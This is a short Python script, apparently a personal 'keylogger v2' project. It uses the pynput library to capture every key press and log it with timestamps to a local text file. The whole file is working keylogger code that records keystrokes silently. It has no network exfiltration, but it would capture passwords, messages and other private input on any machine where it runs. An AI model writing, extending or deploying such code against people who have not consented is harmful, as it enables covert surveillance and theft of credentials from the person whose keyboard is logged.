from pynput.keyboard import Key, Listener
import logging



log_dir = ''
logging.basicConfig(filename=(log_dir + "D:\\python_projectsss\\keylogger\\v2\\keylog.txt"),
                    filemode='w',
                    level=logging.DEBUG, format='["%(asctime)s","%(name)s", %(message)s]')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()